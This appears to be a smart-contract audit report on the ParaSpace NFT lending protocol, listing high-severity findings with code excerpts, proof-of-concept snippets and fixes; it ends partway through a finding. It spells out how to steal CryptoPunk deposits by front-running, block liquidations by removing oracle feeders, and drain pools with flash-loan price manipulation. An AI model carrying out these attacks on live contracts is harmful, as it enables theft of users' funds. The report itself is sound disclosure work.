[H-01] Data corruption inNFTFloorOracle; Denial of Service
Submitted byEnglave, also found byTrust,Josiah,minhquanym,Jeiwan,kaliberpoziomka8552,9svR6w,unforgiven,csanuragjain,RaymondFam, andLambda
During_removeFeederoperation inNFTFloorOraclecontract, the feeder is removed fromfeedersarray, and linking infeederPositionMapfor the specific feeder is removed. Deletion logic is implemented in “Swap + Pop” way, so indexes changes, but existingcode doesn’t update indexes infeederPositionMapafter feeder removal, which causes the issue of Denial of Service for further removals.
As a result:
Impossible to remove somefeedersfrom the contract due to Out of Bounds array access. Removal fails because of transaction revert.Data infeederPositionMapis corrupted after somefeedersremoval. Data linking fromfeederPositionMap.indextofeedersarray is broken.
Proof of Concept
address internal feederA = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;address internal feederB = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;address internal feederC = 0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db;function corruptFeedersMapping() external {console.log("Starting from empty feeders array. Array size: %s", feeders.length);address[] memory initialFeeders = new address[](3);initialFeeders[0] = feederA;initialFeeders[1] = feederB;initialFeeders[2] = feederC;this.addFeeders(initialFeeders);console.log("Feeders array: [%s, %s, %s]", initialFeeders[0], initialFeeders[1], initialFeeders[2]);console.log("Remove feeder B");this.removeFeeder(feederB);console.log("feederPositionMap[A] = %s, feederPositionMap[C] = %s", feederPositionMap[feederA].index, feederPositionMap[feederC].index);console.log("Mapping for Feeder C store index 2, which was not updated after removal of B. Feeders array length is : %s", feeders.length);console.log("Try remove Feeder C. Transaction will be reverted because of access out of bounds of array. Data is corrupted");this.removeFeeder(feederC);}
Snippet execution result:
Tools Used
Visual inspection; Solidity snippet for PoC
Recommended Mitigation Steps
Update index infeederPositionMapafter feeders swap and pop.
feeders[feederIndex] = feeders[feeders.length - 1];feederPositionMap[feeders[feederIndex]].index = feederIndex; //Index update added as a recommendationfeeders.pop();
yubo-ruan (Paraspace) confirmed
Trust (warden) commented:
I’ve submitted this report as well.
However, I believe it does not meet the high criteria set for HIGH severity finding. For HIGH, warden must show a direct loss of funds or damage to the protocol that stems from the specific issue. Here, there are clearly several conditionals that must occur in order for actual damage to take place.
Regardless, will respect judge’s views on the matter.
dmvt commented:
I’ve submitted this report as well. However, I believe it does not meet the high criteria set for HIGH severity finding. For HIGH, warden must show a direct loss of funds or damage to the protocol that stems from the specific issue. Here, there are clearly several conditionals that must occur in order for actual damage to take place. Regardless, will respect judge’s views on the matter.I respectfully disagree. The scenario is likely to occur at some point during normal operation of the protocol. The inability to remove dead or malfunctioning feeders can easily lead to the complete breakdown of the protocol and significant funds loss, the “data corruption” mentioned in the report. The severity of this issue, when it occurs, justifies the high risk rating.

[H-02] Anyone can steal CryptoPunk during the deposit flow to WPunkGateway
Submitted by0x52, also found byDravee,c7e7eff,xiaoming90,KingNFT,Big0XDev, andcccz
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/ui/WPunkGateway.sol#L77-L95https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/ui/WPunkGateway.sol#L129-L155https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/ui/WPunkGateway.sol#L167-L193
All CryptoPunk deposits can be stolen.
Proof of Concept
CryptoPunks were created before the ERC721 standard. A consequence of this is that they do not possess thetransferFrommethod. To approximate this a user canofferPunkForSaleToAddressfor a price of 0 to effectively approve the contract totransferFrom.
WPunkGateway.sol#L77-L95
function supplyPunk(DataTypes.ERC721SupplyParams[] calldata punkIndexes,address onBehalfOf,uint16 referralCode) external nonReentrant {for (uint256 i = 0; i < punkIndexes.length; i++) {Punk.buyPunk(punkIndexes[i].tokenId);Punk.transferPunk(proxy, punkIndexes[i].tokenId);// gatewayProxy is the sender of this function, not the original gatewayWPunk.mint(punkIndexes[i].tokenId);}Pool.supplyERC721(address(WPunk),punkIndexes,onBehalfOf,referralCode);}
The current implementation ofWPunkGateway#supplyPunkallows anyone to execute and determine where the nTokens are minted to. To complete the flow supply flow a user would need toofferPunkForSaleToAddressfor a price of 0 toWPunkGateway. After they have done this, anyone can call the function to deposit the punk and mint the nTokens to themselves, effectively stealing it.
Example:User AownstokenIDof 1. They want to deposit it so they callofferPunkForSaleToAddresswith an amount of 0, effectively approving theWPunkGatewayto transfer their CryptoPunk.User Bmonitors the transactions and immediately callssupplyPunkwith themselves asonBehalfOf. This completes the transfer of the CryptoPunk and deposits it into the pool but mints thenTokenstoUser B, allowing them to effectively steal the CryptoPunk.
The same fundamental issue exists withacceptBidWithCreditandbatchAcceptBidWithCredit.
Recommended Mitigation Steps
Query the punkIndexToAddress to find the owner and only allow owner to deposit:
for (uint256 i = 0; i < punkIndexes.length; i++) {+       address owner = Punk.punkIndexToAddress(punkIndexes[i].tokenId);+       require(owner == msg.sender);Punk.buyPunk(punkIndexes[i].tokenId);Punk.transferPunk(proxy, punkIndexes[i].tokenId);// gatewayProxy is the sender of this function, not the original gatewayWPunk.mint(punkIndexes[i].tokenId);}
yubo-ruan (Paraspace) confirmed

[H-03] Interest rates are incorrect on Liquidation
Submitted bycsanuragjain, also found byunforgivenandcccz
The debt tokens are being transferred before calculating the interest rates. But the interest rate calculation function assumes that debt token has not yet been sent thus the outcomecurrentLiquidityRatewill be incorrect
Proof of Concept
Liquidator L1 callsexecuteLiquidateERC20for a position whose health factor <1
function executeLiquidateERC20(mapping(address => DataTypes.ReserveData) storage reservesData,mapping(uint256 => address) storage reservesList,mapping(address => DataTypes.UserConfigurationMap) storage usersConfig,DataTypes.ExecuteLiquidateParams memory params) external returns (uint256) {..._burnDebtTokens(liquidationAssetReserve, params, vars);...}
This internally calls_burnDebtTokens
function _burnDebtTokens(DataTypes.ReserveData storage liquidationAssetReserve,DataTypes.ExecuteLiquidateParams memory params,ExecuteLiquidateLocalVars memory vars) internal {...// Transfers the debt asset being repaid to the xToken, where the liquidity is keptIERC20(params.liquidationAsset).safeTransferFrom(vars.payer,vars.liquidationAssetReserveCache.xTokenAddress,vars.actualLiquidationAmount);...// Update borrow & supply rateliquidationAssetReserve.updateInterestRates(vars.liquidationAssetReserveCache,params.liquidationAsset,vars.actualLiquidationAmount,0);}
Basically first it transfers the debt asset to xToken using below. This increases the balance of xTokenAddress for liquidationAsset
IERC20(params.liquidationAsset).safeTransferFrom(vars.payer,vars.liquidationAssetReserveCache.xTokenAddress,vars.actualLiquidationAmount);
NowupdateInterestRatesfunction is called on ReserveLogic.sol#L169
function updateInterestRates(DataTypes.ReserveData storage reserve,DataTypes.ReserveCache memory reserveCache,address reserveAddress,uint256 liquidityAdded,uint256 liquidityTaken) internal {...(vars.nextLiquidityRate,vars.nextVariableRate) = IReserveInterestRateStrategy(reserve.interestRateStrategyAddress).calculateInterestRates(DataTypes.CalculateInterestRatesParams({liquidityAdded: liquidityAdded,liquidityTaken: liquidityTaken,totalVariableDebt: vars.totalVariableDebt,reserveFactor: reserveCache.reserveFactor,reserve: reserveAddress,xToken: reserveCache.xTokenAddress}));...}
Finally call tocalculateInterestRatesfunction on DefaultReserveInterestRateStrategy#L127 contract is made which calculates the interest rate
function calculateInterestRates(DataTypes.CalculateInterestRatesParams calldata params) external view override returns (uint256, uint256) {...if (vars.totalDebt != 0) {vars.availableLiquidity =IToken(params.reserve).balanceOf(params.xToken) +params.liquidityAdded -params.liquidityTaken;vars.availableLiquidityPlusDebt =vars.availableLiquidity +vars.totalDebt;vars.borrowUsageRatio = vars.totalDebt.rayDiv(vars.availableLiquidityPlusDebt);vars.supplyUsageRatio = vars.totalDebt.rayDiv(vars.availableLiquidityPlusDebt);}...vars.currentLiquidityRate = vars.currentVariableBorrowRate.rayMul(vars.supplyUsageRatio).percentMul(PercentageMath.PERCENTAGE_FACTOR - params.reserveFactor);return (vars.currentLiquidityRate, vars.currentVariableBorrowRate);}
As we can see in above code,vars.availableLiquidityis calculated asIToken(params.reserve).balanceOf(params.xToken) +params.liquidityAdded - params.liquidityTakenBut the problem is that debt token is already transferred toxTokenwhich meansxTokenalready consist ofparams.liquidityAdded. Hence the calculation ultimately becomes(xTokenBeforeBalance+params.liquidityAdded) +params.liquidityAdded - params.liquidityTakenThis is incorrect and would lead to highervars.availableLiquiditywhich ultimately impacts thecurrentLiquidityRate
Recommended Mitigation Steps
Transfer the debt asset post interest calculation
function _burnDebtTokens(DataTypes.ReserveData storage liquidationAssetReserve,DataTypes.ExecuteLiquidateParams memory params,ExecuteLiquidateLocalVars memory vars) internal {IPToken(vars.liquidationAssetReserveCache.xTokenAddress).handleRepayment(params.liquidator, vars.actualLiquidationAmount);// Burn borrower's debt tokenvars.liquidationAssetReserveCache.nextScaledVariableDebt = IVariableDebtToken(vars.liquidationAssetReserveCache.variableDebtTokenAddress).burn(params.borrower,vars.actualLiquidationAmount,vars.liquidationAssetReserveCache.nextVariableBorrowIndex);liquidationAssetReserve.updateInterestRates(vars.liquidationAssetReserveCache,params.liquidationAsset,vars.actualLiquidationAmount,0);IERC20(params.liquidationAsset).safeTransferFrom(vars.payer,vars.liquidationAssetReserveCache.xTokenAddress,vars.actualLiquidationAmount);......}

[H-04] Anyone can prevent themselves from being liquidated as long as they hold one of the supported NFTs
Submitted byIllIllI, also found byAymen0909,pashov,hansfriese,0xNazgul,xiaoming90,Awesome,fatherOfBlocks,kaliberpoziomka8552,shark,unforgiven,csanuragjain,Atarpara,ali_shehab,web3er,pzeus,Kong,BClabs,bullseye,chaduke,datapunk, andnicobevi
Contrary to what the function comments say,removeFeeder()is able to be called by anyone, not just the owner. By removing all feeders (i.e. floor twap price oracle keepers), a malicious user can cause all queries for the price of NFTs reliant on theNFTFloorOracle(all NFTs except for the UniswapV3 ones), to revert, which will cause all calls toliquidateERC721()to revert.
Impact
If NFTs can’t be liquidated, positions will remain open for longer than they should, and the protocol may become insolvent by the time the issue is resolved.
Proof of Concept
TheonlyRole(DEFAULT_ADMIN_ROLE)should have been used instead ofonlyWhenFeederExisted…
File: /paraspace-core/contracts/misc/NFTFloorOracle.sol#1165/// @notice Allows owner to remove feeder.166/// @param _feeder feeder to remove167functionremoveFeeder(address_feeder)168external169onlyWhenFeederExisted(_feeder)170      {171_removeFeeder(_feeder);172:     }
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L165-L172
… sinceonlyWhenFeederExistedis already on the internal call to_removeFeeder()(onlyWhenFeederExisteddoesn’t do any authentication of the caller):
File: /paraspace-core/contracts/misc/NFTFloorOracle.sol#2326function_removeFeeder(address_feeder)327internal328onlyWhenFeederExisted(_feeder)329      {330uint8feederIndex=feederPositionMap[_feeder].index;331if(feederIndex>=0&&feeders[feederIndex] ==_feeder) {332feeders[feederIndex] =feeders[feeders.length-1];333feeders.pop();334}335deletefeederPositionMap[_feeder];336revokeRole(UPDATER_ROLE,_feeder);337emitFeederRemoved(_feeder);338:     }
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L326-L338
Note thatfeedersmust have theUPDATER_ROLE(revoked above) in order to update the price.
The fetching of the price will revert if the price is stale:
File: /paraspace-core/contracts/misc/NFTFloorOracle.sol#3234/// @param _asset The nft contract235/// @return price The most recent price on chain236functiongetPrice(address_asset)237external238view239override240returns(uint256price)241      {242uint256updatedAt=assetPriceMap[_asset].updatedAt;243require(244@>           (block.number-updatedAt) <=config.expirationPeriod,245"NFTOracle: asset price expired"246);247returnassetPriceMap[_asset].twap;248:     }
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L234-L248
And it will become stale if there are no feeders for enough time:
File: /paraspace-core/contracts/misc/NFTFloorOracle.sol#4195functionsetPrice(address_asset,uint256_twap)196public197 @>onlyRole(UPDATER_ROLE)198onlyWhenAssetExisted(_asset)199whenNotPaused(_asset)200      {201booldataValidity=false;202if(hasRole(DEFAULT_ADMIN_ROLE,msg.sender)) {203@>_finalizePrice(_asset,_twap);204return;205}206dataValidity=_checkValidity(_asset,_twap);207require(dataValidity,"NFTOracle: invalid price data");208// add price to raw feeder storage209_addRawValue(_asset,_twap);210uint256medianPrice;211// set twap price only when median value is valid212(dataValidity,medianPrice) =_combine(_asset,_twap);213if(dataValidity) {214@>_finalizePrice(_asset,medianPrice);215}216:     }
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L195-L216
File: /paraspace-core/contracts/misc/NFTFloorOracle.sol#5376function_finalizePrice(address_asset,uint256_twap)internal{377PriceInformationstorageassetPriceMapEntry=assetPriceMap[_asset];378assetPriceMapEntry.twap=_twap;379@>assetPriceMapEntry.updatedAt=block.number;380assetPriceMapEntry.updatedTimestamp=block.timestamp;381emitAssetDataSet(382_asset,383assetPriceMapEntry.twap,384assetPriceMapEntry.updatedAt385);386:     }
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L376-L386
Note that the default staleness interval is six hours:
File: /paraspace-core/contracts/misc/NFTFloorOracle.sol#610//expirationPeriod at least the interval of client to feed data(currently 6h=21600s/12=1800 in mainnet)11//we do not accept price lags behind to much12:uint128constantEXPIRATION_PERIOD=1800;
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L10-L12
The revertinggetPrice()function is called from theERC721OracleWrapperwhere it is not caught:
File: /paraspace-core/contracts/misc/ERC721OracleWrapper.sol#744functionsetOracle(address_oracleAddress)45external46onlyAssetListingOrPoolAdmins47       {48@>oracleAddress=INFTFloorOracle(_oracleAddress);49}50...5455functionlatestAnswer()externalviewoverridereturns(int256) {56@>returnint256(oracleAddress.getPrice(asset));57:      }
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/ERC721OracleWrapper.sol#L44-L57
And neither is it caught from any of the callers further up the chain (note that the fallback oracle can’t be hit since the call reverts before that):
File: /paraspace-core/contracts/misc/ERC721OracleWrapper.sol#810:contractERC721OracleWrapperisIEACAggregatorProxy{
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/ERC721OracleWrapper.sol#L10
File: /paraspace-core/contracts/misc/ParaSpaceOracle.sol#9114/// @inheritdoc IPriceOracleGetter115functiongetAssetPrice(addressasset)116public117view118override119returns(uint256)120      {121if(asset==BASE_CURRENCY) {122returnBASE_CURRENCY_UNIT;123}124125uint256price=0;126@>IEACAggregatorProxysource=IEACAggregatorProxy(assetsSources[asset]);127if(address(source) !=address(0)) {128@>price=uint256(source.latestAnswer());129}130if(price==0&&address(_fallbackOracle) !=address(0)) {131price=_fallbackOracle.getAssetPrice(asset);132}133134require(price!=0,Errors.ORACLE_PRICE_NOT_READY);135returnprice;136:     }
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/ParaSpaceOracle.sol#L114-L136
File: /paraspace-core/contracts/protocol/libraries/logic/GenericLogic.sol#10535function_getAssetPrice(addressoracle,addresscurrentReserveAddress)536internal537view538returns(uint256)539      {540@>returnIPriceOracleGetter(oracle).getAssetPrice(currentReserveAddress);541:     }
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/GenericLogic.sol#L535-L541
File: /paraspace-core/contracts/protocol/libraries/logic/GenericLogic.sol:_getUserBalanceForERC721()  #11388@>uint256assetPrice=_getAssetPrice(389params.oracle,390vars.currentReserveAddress391);392totalValue=393ICollateralizableERC721(vars.xTokenAddress)394.collateralizedBalanceOf(params.user) *395assetPrice;396:         }
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/GenericLogic.sol#L388-L396
File: /paraspace-core/contracts/protocol/libraries/logic/GenericLogic.sol:calculateUserAccountData()  #12214vars215.userBalanceInBaseCurrency=_getUserBalanceForERC721(216params,217vars218:                         );
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/GenericLogic.sol#L214-L218
File: /paraspace-core/contracts/protocol/libraries/logic/LiquidationLogic.sol#13286functionexecuteLiquidateERC721(287mapping(address=>DataTypes.ReserveData)storagereservesData,288mapping(uint256=>address)storagereservesList,289mapping(address=>DataTypes.UserConfigurationMap)storageusersConfig,290DataTypes.ExecuteLiquidateParamsmemoryparams291      )externalreturns(uint256) {292ExecuteLiquidateLocalVarsmemoryvars;...311(312vars.userGlobalCollateral,313,314vars.userGlobalDebt,//in base currency315,316,317,318,319,320vars.healthFactor,321322@>       ) =GenericLogic.calculateUserAccountData(323reservesData,324reservesList,325DataTypes.CalculateUserAccountDataParams({326userConfig:userConfig,327reservesCount:params.reservesCount,328user:params.borrower,329oracle:params.priceOracle330})331:         );
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/LiquidationLogic.sol#L286-L331
File: /paraspace-core/contracts/protocol/pool/PoolCore.sol#14457/// @inheritdoc IPoolCore458functionliquidateERC721(459addresscollateralAsset,460addressborrower,461uint256collateralTokenId,462uint256maxLiquidationAmount,463boolreceiveNToken464      )externalpayablevirtualoverridenonReentrant{465DataTypes.PoolStoragestorageps=poolStorage();466467@>LiquidationLogic.executeLiquidateERC721(468ps._reserves,469ps._reservesList,470:ps._usersConfig,
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/pool/PoolCore.sol#L457-L470
A person close to liquidation can remove all feeders, giving themselves a free option on whether the extra time it takes for the admins to resolve the issue, is enough time for their position to go back into the green. Alternatively, a competitor can analyze what price most liquidations will occur at (based on on-chain data about every user’s account health), and can time the removal of feeders for maximum effect. Note that even if the admins re-add the feeders, the malicious user can just remove them again.
Recommended Mitigation Steps
Add theonlyRole(DEFAULT_ADMIN_ROLE)modifier toremoveFeeder().
yubo-ruan (Paraspace) confirmed via duplicate issue#55

[H-05] Attacker can manipulate low TVL Uniswap V3 pool to borrow and swap to make Lending Pool in loss
Submitted byminhquanym
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/UniswapV3OracleWrapper.sol#L176
In Paraspace protocol, any Uniswap V3 position that are consist of ERC20 tokens that Paraspace support can be used as collateral to borrow funds from Paraspace pool. The value of the Uniswap V3 position will be sum of value of ERC20 tokens in it.
functiongetTokenPrice(uint256tokenId)publicviewreturns(uint256) {UinswapV3PositionDatamemorypositionData=getOnchainPositionData(tokenId);PairOracleDatamemoryoracleData=_getOracleData(positionData);(uint256liquidityAmount0,uint256liquidityAmount1) =LiquidityAmounts.getAmountsForLiquidity(oracleData.sqrtPriceX96,TickMath.getSqrtRatioAtTick(positionData.tickLower),TickMath.getSqrtRatioAtTick(positionData.tickUpper),positionData.liquidity);(uint256feeAmount0,uint256feeAmount1) =getLpFeeAmountFromPositionData(positionData);return// @audit can be easily manipulated with low TVL pool(((liquidityAmount0+feeAmount0) *oracleData.token0Price) /10**oracleData.token0Decimal) +(((liquidityAmount1+feeAmount1) *oracleData.token1Price) /10**oracleData.token1Decimal);}
However, Uniswap V3 can have multiple pools for thesame pairsof ERC20 tokens withdifferent feeparams. A fews has most the liquidity, while other pools have extremely little TVL or even not created yet. Attackers can abuse it, create low TVL pool where liquidity in this pool mostly (or fully) belong to attacker’s position, deposit this position as collateral and borrow token in Paraspace pool, swap to make the original position reduce the original value and cause Paraspace pool in loss.
Proof of Concept
Consider the scenario where WETH and DAI are supported as collateral in Paraspace protocol.
Alice (attacker) create a new WETH/DAI pool in Uniswap V3 and add liquidity with the following amount1e18 wei WETH - 1e6 wei DAI = 1 WETH - 1e-12 DAI ~= 1 ETHLet’s just assume Alice position has price range from[MIN_TICK, MAX_TICK]so the math can be approximately like Uniswap V2 - constant product.Note that this pool only has liquidity from Alice.Alice deposit this position into Paraspace, value of this position is approximately1 WETHand Alice borrow maximum possible amount of USDC.Alice make swap in her WETH/DAI pool in Uniswap V3 to make the position become1e6 wei WETH - 1e18 wei DAI = 1e-12 WETH - 1 DAI ~= 1 DAI
Please note that the math I’ve done above is approximation based on Uniswap V2 formulax * y = kbecause Alice provided liquidity fromMIN_TICKtoMAX_TICK.For more information about Uniswap V3 formula, please check their whitepaper here:https://uniswap.org/whitepaper-v3.pdf.
Recommended Mitigation Steps
Consider adding whitelist, only allowing pool with enough TVL to be collateral in Paraspace protocol.
LSDan (judge) commented:
Overinflated severity
minhquanym (warden) commented:
Hi @LSDan,
Maybe there is a misunderstanding here. I believed I gave enough proof to make it a High issue and protocol can be at loss.You can think of it as using Uniswap V3 pool as a price Oracle. However, it did not even use TWA price but spot price and pool with low liquidity is really easy to be manipulated. We all can see many examples about Price manipulation attacks recently and they had a common cause that price can be changed in one block.About the Uniswap V3 pool with low liquidity, you can check out this onehttps://etherscan.io/address/0xbb256c2F1B677e27118b0345FD2b3894D2E6D487.This is a USDC-USDT pool with only$8kin it.
LSDan (judge) commented:
This is not true because Alice’s pool will be immediately arbed each time she attempts a price manipulation. Accordingly, this issue only exists when a pair has very low liquidity on UniV3 and no liquidity elsewhere. I would have accepted this as a QA, but it does not fall into the realm of a high risk issue.I’m open to accepting this as a medium if you can give me a more concrete scenario where the value that Alice is extracting from the protocol through this attack is sustainable and significant enough to exceed the gas price of creating a new UniV3 pool.
minhquanym (warden) commented:
@LSDan, Please correct me if I’m wrong but I don’t think Alice’s pool can be arbed when the whole attack happens in 1 transaction. Because of that, I still believe that this is a High. For example,price before manipulation isp1flash loan and swap to change the price top2add liquidity and borrow at pricep2change the price back top1repay the flash loanThat’s basically the idea. You can see price is back top1at the end.
LSDan (judge) commented:
Ok yeah… I see what you’re saying now. This could be used to drain the pool because the underlying asset price comes from a different oracle. So if Alice creates a pool with 100 USDC and 100 USDT, and drops 3mm USDC from a flash loan into it, the external oracle will value the LP at$3mm. High makes sense. Thanks for the additional clarity.

[H-06] Discrepency in the Uniswap V3 position price calculation because of decimals
Submitted byFranfran, also found by__141345__andpoirots
When the squared root of the Uniswap V3 position is calculated from the_getOracleData()function, the price may return a very high number (in the case that the token1 decimals are strictly superior to the token0 decimals). See:https://github.com/code-423n4/2022-11-paraspace/blob/main/paraspace-core/contracts/misc/UniswapV3OracleWrapper.sol#L249-L260
The reason is that at the denominator, the1E9(10**9) value is hard-coded, but should take into account the delta between both decimals.As a result, in the case oftoken1Decimal > token0Decimal, thegetAmountsForLiquidity()is going to return a huge value for the amount of token0 and token1 as the user position liquidity.
ThegetTokenPrice(), using this amount of liquidity tocalculate the token priceis as its turn going to return a huge value.
Proof of Concept
This POC demonstrates in which case the returned squared root price of the position is over inflated
// SPDX-License-Identifier: UNLISENCEDpragmasolidity0.8.10;import{SqrtLib}from"../contracts/dependencies/math/SqrtLib.sol";import"forge-std/Test.sol";contractAuditisTest{functiontestSqrtPriceX96()public{// okuint160price1=getSqrtPriceX96(1e18,5*1e18,18,18);// okuint160price2=getSqrtPriceX96(1e18,5*1e18,18,9);// Has an over-inflated squared root price by 9 magnitudes as token0Decimal < token1Decimaluint160price3=getSqrtPriceX96(1e18,5*1e18,9,18);}functiongetSqrtPriceX96(uint256token0Price,uint256token1Price,uint256token0Decimal,uint256token1Decimal)privateviewreturns(uint160sqrtPriceX96) {if(oracleData.token1Decimal==oracleData.token0Decimal) {// multiply by 10^18 then divide by 10^9 to preserve price in weisqrtPriceX96=uint160((SqrtLib.sqrt(((token0Price* (10**18)) / (token1Price))) *2**96) /1E9);}elseif(token1Decimal>token0Decimal) {// multiple by 10^(decimalB - decimalA) to preserve price in weisqrtPriceX96=uint160((SqrtLib.sqrt((token0Price* (10**(18+token1Decimal-token0Decimal))) /(token1Price)) *2**96) /1E9);}else{// multiple by 10^(decimalA - decimalB) to preserve price in wei then divide by the same numbersqrtPriceX96=uint160((SqrtLib.sqrt((token0Price* (10**(18+token0Decimal-token1Decimal))) /(token1Price)) *2**96) /10**(9+token0Decimal-token1Decimal));}}}
Recommended Mitigation Steps
if(oracleData.token1Decimal==oracleData.token0Decimal) {// multiply by 10^18 then divide by 10^9 to preserve price in weioracleData.sqrtPriceX96=uint160((SqrtLib.sqrt(((oracleData.token0Price* (10**18)) /(oracleData.token1Price))) *2**96) /1E9);}elseif(oracleData.token1Decimal>oracleData.token0Decimal) {// multiple by 10^(decimalB - decimalA) to preserve price in weioracleData.sqrtPriceX96=uint160((SqrtLib.sqrt((oracleData.token0Price*(10**(18+oracleData.token1Decimal-oracleData.token0Decimal))) /(oracleData.token1Price)) *2**96) /10**(9+oracleData.token1Decimal-oracleData.token0Decimal));}else{// multiple by 10^(decimalA - decimalB) to preserve price in wei then divide by the same numberoracleData.sqrtPriceX96=uint160((SqrtLib.sqrt((oracleData.token0Price*(10**(18+oracleData.token0Decimal-oracleData.token1Decimal))) /(oracleData.token1Price)) *2**96) /10**(9+oracleData.token0Decimal-oracleData.token1Decimal));}

[H-07] User can pass auction recovery health check easily with flashloan
Submitted byTrust
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/pool/PoolParameters.sol#L281
ParaSpace features an auction mechanism to liquidate user’s NFT holdings and receive fair value. User has the option, before liquidation actually happens but after auction started, to top up their account to above recovery factor (> 1.5 instead of > 1) and usesetAuctionValidityTime()to invalidate the auction.
require(erc721HealthFactor > ps._auctionRecoveryHealthFactor,Errors.ERC721_HEALTH_FACTOR_NOT_ABOVE_THRESHOLD);userConfig.auctionValidityTime = block.timestamp;
The issue is that the check validates the account is topped in the moment the TX is executed. Therefore, user may very easily make it appear they have fully recovered by borrowing a large amount of funds, depositing them as collateral, registering auction invalidation, removing the collateral and repaying the flash loan. Reentrancy guards are not effective to prevent this attack because all these actions are done in a sequence, one finishes before the other begins. However, it is clear user cannot immediately finish this attack below liquidation threshold because health factor check will not allow it.
Still, the recovery feature is a very important feature of the protocol and a large part of what makes it unique, which is why I think it is very significant that it can be bypassed.I am on the fence on whether this should be HIGH or MED level impact, would support judge’s verdict either way.
Impact
User can pass auction recovery health check easily with flashloan.
Proof of Concept
User places NFT as collateral in the protocolUser borrows using the NFT as collateralNFT price drops and health factor is lower than liquidation thresholdAuction to sell NFT initiatesUser deposits just enough to be above liquidation thresholdUser now flashloans 1000 WETHsupply 1000 WETH to the protocolcall setAuctionValidityTime(), cancelling the auctionwithdraw the 1000 WETH from the protocolpay back the 1000 WETH flashloanEnd result is bypassing of recovery health check
Recommended Mitigation Steps
In order to know user has definitely recovered, implement it as a function which holds the user’s assets for X time (at least 5 minutes), then releases it back to the user and cancelling all their auctions.
LSDan (judge) commented:
I agree with high risk for this. It’s a direct attack on the intended functionality of the protocol that can result in a liquidation delay and potential loss of funds.

[H-08] NFTFloorOracle’s asset and feeder structures can be corrupted
Submitted byhyh, also found bybrgltd,minhquanym,Jeiwan, andgzeon
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L278-L286https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L307-L316
NFTFloorOracle’s_addAsset()and_addFeeder()truncate theassetsandfeedersarrays indices to 255, both usinguint8 indexfield in the corresponding structures and performinguint8(assets.length - 1)truncation on the new element addition.
2^8 - 1looks to be too tight as anall timeelement count limit. It can be realistically surpassed in a couple years time, especially given multi-asset and multi-feeder nature of the protocol. This way this isn’t a theoretical unsafe truncation, but an accounting malfunction that is practically reachable given long enough system lifespan, without any additional requirements as asset/feeder turnaround is a going concern state of the system.
Impact
Once truncation start corrupting the indices the asset/feeder structures will become incorrectly referenced and removal of an element will start to remove another one, permanently breaking up the structures.
This will lead to inability to control these structures and then to Oracle malfunction. This can lead to collateral mispricing. Setting the severity to be medium due to prerequisites.
Proof of Concept
feederPositionMapandassetFeederMapuseuint8indices:
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L32-L48
structFeederRegistrar{// if asset registered or notboolregistered;// index in asset listuint8index;// if asset paused,reject the priceboolpaused;// feeder -> PriceInformationmapping(address=>PriceInformation)feederPrice;}structFeederPosition{// if feeder registered or notboolregistered;// index in feeder listuint8index;}
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L79-L88
/// @dev feeder map// feeder address -> index in feeder listmapping(address=>FeederPosition)privatefeederPositionMap;.../// @dev Original raw value to aggregate with// the NFT contract address -> FeederRegistrar which contains price from each feedermapping(address=>FeederRegistrar)publicassetFeederMap;
On entry removal bothassetsarray length do not decrease:
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L296-L305
